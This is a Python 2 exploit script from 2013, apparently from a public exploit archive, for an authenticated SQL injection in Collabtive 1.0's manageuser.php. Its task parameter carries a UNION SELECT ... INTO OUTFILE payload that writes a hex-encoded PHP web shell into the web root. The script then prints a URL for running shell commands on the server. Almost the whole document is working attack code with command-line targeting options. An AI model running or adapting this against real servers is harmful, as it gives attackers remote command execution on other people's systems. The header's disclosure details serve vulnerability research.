# Date: 06/17/2013
# Exploit Author: drone (@dronesec)
# More information: http://forelsec.blogspot.com/2013/06/collabtive-10-sqli.html
# Vendor homepage: http://collabtive.o-dyn.de/
# Software link: http://downloads.sourceforge.net/project/collabtive/collabtive/1.0/collabtive-10.zip
# Version: 1.0
# Fixed In: https://github.com/philippK-de/Collabtive
# Tested on: Ubuntu 12.04 (apparmor disabled)
 
""" Collabtive 1.0 SQL injection web shell
 
    Requires authenticated user.
"""
from argparse import ArgumentParser
import string
import random
import urllib, urllib2
import sys
 
def run(options):
    print &#039;[!] Dropping web shell on %s...&#039;%options.ip
 
    shell = &#039;&#039;.join(random.choice(string.ascii_lowercase+string.digits) for x in range(5))
 
    # <? php system($_GET["rr"]); ?>
    exploit = &#039;{0}%20UNION%20SELECT%200x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e&#039;\
              &#039;%20INTO%20OUTFILE%20\&#039;{1}/{2}.php\&#039;&#039;.format(options.task,options.path,shell)
 
    query_string = &#039;action=profile&id={0}&project={1}&task={2}&#039;.format(options.id,options.project,
                                                                        exploit)
    request = urllib2.build_opener()
    request.addheaders.append((&#039;Cookie&#039;, &#039;PHPSESSID=%s&#039;%options.session.strip()))
 
    try:
        request.open(&#039;http://{0}{1}/manageuser.php?{2}&#039;.format(
                                                options.ip, options.rootp,query_string))
    except: pass
    print &#039;[!] Shell dropped.  http://{0}{1}/{2}.php?rr=ls&#039;.format(options.ip, options.rootp, shell)
def parse():
    parser = ArgumentParser()
    parser.add_argument("-i", help=&#039;server address&#039;, action=&#039;store&#039;, dest=&#039;ip&#039;, required=True)
    parser.add_argument(&#039;-P&#039;, help=&#039;valid php session id&#039;, action=&#039;store&#039;,
                        dest=&#039;session&#039;, required=True)
    parser.add_argument("-p", help=&#039;path to manageuser.php (/collabtive)&#039;,action=&#039;store&#039;,
                        default=&#039;/collabtive&#039;, dest=&#039;rootp&#039;)
    parser.add_argument("-w", help="writable web path (/var/www/collabtive)",action=&#039;store&#039;,
                        default=&#039;/var/www/collabtive&#039;, dest=&#039;path&#039;)
    parser.add_argument(&#039;--id&#039;, help=&#039;collab id (1)&#039;, action=&#039;store&#039;, default=1, dest=&#039;id&#039;)
    parser.add_argument(&#039;--project&#039;, help=&#039;project id (1)&#039;, action=&#039;store&#039;, default=1,
                        dest=&#039;project&#039;)
    parser.add_argument(&#039;--task&#039;, help=&#039;task id (1)&#039;, action=&#039;store&#039;, default=1,
                        dest=&#039;task&#039;)
 
    options = parser.parse_args()
    options.path = options.path if options.path[-1] != &#039;/&#039; else options.path[:-1]
    options.rootp = options.rootp if options.rootp[-1] != &#039;/&#039; else options.rootp[:-1]
    return options
 
if __name__=="__main__":
    run(parse())

